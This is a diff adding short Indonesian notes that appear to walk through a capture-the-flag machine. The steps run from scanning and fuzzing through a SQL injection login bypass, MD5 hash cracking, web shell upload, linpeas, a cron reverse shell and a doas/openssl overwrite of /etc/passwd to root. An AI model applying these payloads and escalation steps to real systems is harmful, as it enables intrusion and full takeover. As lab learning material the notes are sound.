@@ -1,0 +1,9 @@
+1. scan 80 445 22 kebuka -> fuzz semua ada management fuzz lagi -> ampe nemu databases
+2. disini banyak rabbit hole sebenernya -> wget aja sql nya -> cari tuh tabel users ada passwd nya md5 decrypt aja
+3. gabisa jir -> sqli aja -> admin' or 1=1-- -
+4. buat user soalnya yg ada avatarnya upload shell -> cek list nya -> open image in new tab sambil nyalain nc 
+5. wget ke linpeas -> cek di cronjobs ada script tuh -> edit aja pake revshell dari which shell atau nc mkfifo juga bisa
+6. baca di checking doas conf juga -> bisa ke root itu
+7. biar ke root -> cp /etc/passwd /tmp -> echo "root::0:0:root:/root:/bin/bash" | doas openssl enc -out /etc/passwd 
+8. dahlah gabisa -> gtfobins openssl aja root nya -> openssl 
+9. yg read tuh -> LFILE=/root/root.txt -> doas -u root openssl enc -in "$LFILE"
